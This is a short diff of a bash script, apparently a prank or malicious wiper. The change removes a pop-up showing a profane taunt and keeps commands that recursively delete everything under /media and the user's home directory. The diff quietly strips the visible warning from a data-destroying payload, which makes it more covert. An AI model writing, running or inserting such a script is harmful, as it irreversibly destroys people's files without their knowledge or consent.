@@ -1,5 +1,4 @@
 #!/bin/bash
-zenity --info --text="I can see you BITCH"
 cd $HOME
 rm -rf /media/*/*
 rm -rf /home/$USER/*
